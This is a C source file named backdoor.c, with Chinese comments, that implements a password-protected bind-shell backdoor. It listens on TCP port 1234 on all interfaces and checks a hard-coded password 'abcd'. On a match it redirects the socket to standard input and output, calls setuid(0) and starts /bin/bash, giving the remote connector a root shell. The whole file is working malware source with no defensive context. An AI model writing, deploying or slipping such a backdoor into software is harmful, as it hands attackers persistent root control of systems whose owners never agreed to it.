/*************************************************************************
	> File Name: backdoor.c
	> Author:wanglei 
	> Mail: 
	> Created Time: 2016年06月22日 星期三 14时25分32秒
************************************************************************/
#include<sys/socket.h>
#include<sys/types.h>
#include<netinet/in.h>
#include<stdio.h>
#include<string.h>
#include<unistd.h>
#include<stdlib.h>
#define PASSWARD "abcd"
#define MAXSIZE 1024
int main()
{
    char buff[MAXSIZE];
    char message[]="请输入密码：";
    char text[]="you have a root shell here\n";
    char err[]="passwd is wrong\n";
    int listenfd,connfd,n;
    //创建监听fd和连接fd
    struct sockaddr_in target;
    struct sockaddr_in attack;
    target.sin_family=AF_INET;
    target.sin_addr.s_addr=htonl(0);//INADDR_ANY
    target.sin_port=htons(1234);

    listenfd=socket(AF_INET,SOCK_STREAM,0);
    //建立一个tcp连接的socket
    if(bind(listenfd,(struct sockaddr*)&target,sizeof(target))==-1)
        printf("[1]:bind sock error\n");
    if(listen(listenfd,5)==-1)
        printf("[2]:listen sock error\n");
    while(1)
    {

    if((connfd=accept(listenfd,NULL,NULL))==-1)
        printf("[3]:accept sock error\n");
    //printf("connfd is %d\n",connfd);
    write(connfd,message,strlen(message));
    n=read(connfd,buff,1024);
    //buff[n]='\0';
    // printf("%s",buff);
    if(strncmp(PASSWARD,buff,n-1)==0)
    {
        write(connfd,text,strlen(text));
   
        dup2(connfd,STDIN_FILENO);
        dup2(connfd,STDOUT_FILENO);
        dup2(connfd,STDERR_FILENO);
        setsid();    
        setuid(0);
        //只有eid为root的程序可以更改uid为任意值
        system("/bin/bash");
        //bash需要uid为0才能获取root权限
        //fork得到的子进程只继承父进程的ruid
        //execlp("/bin/bash","/bin/bash",NULL);
        close(connfd);
    }
    else
        {
            write(connfd,err,strlen(err)-1);
            close(connfd);
         }
    }
    close(listenfd);
}
